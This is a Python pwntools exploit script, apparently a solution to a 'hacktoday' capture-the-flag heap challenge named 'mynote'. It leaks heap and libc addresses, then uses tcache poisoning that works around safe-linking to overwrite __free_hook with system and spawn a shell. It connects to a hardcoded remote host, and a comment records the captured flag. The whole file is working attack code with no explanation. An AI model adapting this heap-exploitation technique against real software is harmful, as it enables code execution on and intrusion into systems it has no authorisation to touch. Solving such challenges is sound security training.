#!/usr/bin/python

from pwn import *

PATH = './mynote'

GDBSCRIPT = '''
    source ~/debug/loadsym.py
    set debug-file-directory ~/debug/ubuntu-20.10/dbg64/
    loadsym ~/debug/ubuntu-20.10/dbg64/libc-2.32.so
'''

HOST = '103.41.207.206'
PORT = 17014

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])

def alloc(index, size, data):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', f'{index}')
    r.sendlineafter(': ', f'{size}')
    if size > 1:
        r.sendafter(': ', data)

def show(index):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', f'{index}')
    return r.recvline(0)

def copy(src, dest):
    r.sendlineafter('> ', '4')
    r.sendlineafter(': ', f'{src}')
    r.sendlineafter(': ', f'{dest}')

def move(src, dest):
    r.sendlineafter('> ', '3')
    r.sendlineafter(': ', f'{src}')
    r.sendlineafter(': ', f'{dest}')

def exploit(r):
    alloc(0, 0x30, 'A' * 8 + '\n')
    alloc(1, 0x30, 'A' * 8 + '\n')
     
    move(0, 0)
    move(1, 1)

    heap = u64(show(0).ljust(8, b'\0')) << 12
    info(hex(heap))

    payload = p64(((heap + 0x2e0) >> 12) ^ (heap + 0x330)) + p64(heap + 0x10)

    alloc(2, 0x18, payload + b'\n')

    copy(2, 1)

    alloc(3, 0x40, 'A' * 8 + '\n')    
    
    for _ in range(12):
        alloc(4, 0x40, 'A' * 8 + '\n')

    alloc(4, 0x10, 'A' * 8 + '\n')
    alloc(4, 0x10, 'A' * 8 + '\n')

    alloc(0, 0x30, 'A' * 8 + '\n')
    alloc(1, 0x30, p64(0) + p64(0x431) + b'\n')

    alloc(4, 0x1, 'LOL')
    alloc(5, 0x1, 'LOL')
    
    move(4, 4)

    move(3, 3)    
    copy(4, 3)

    leak = u64(show(3).ljust(8, b'\0')) & ~0xFF
    libc.address = leak - 0x1e3c00
    
    info(hex(leak))
    info(hex(libc.address))
    
    copy(5, 3)

    alloc(4, 0x18, 'A' * 8 + '\n')
    alloc(5, 0x18, 'A' * 8 + '\n')
    
    payload = p64(((heap + 0x340) >> 12) ^ (libc.sym['__free_hook']))
    alloc(6, 0x18, payload + b'\n')

    move(4, 4)
    move(5, 5)
    
    copy(6, 5)

    alloc(6, 0x18, '/bin/sh\n')
    alloc(4, 0x18, p64(libc.sym['system']) + b'\n')
    
    move(6, 6)
    
    # hacktoday{u_hacked_my_notes_OHNOOOOOOO}
    # debug(GDBSCRIPT)

    r.interactive()

if __name__ == '__main__':
    elf  = ELF(PATH)
    libc = ELF('./libc.so.6', False)

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(PATH, aslr=0)
    exploit(r)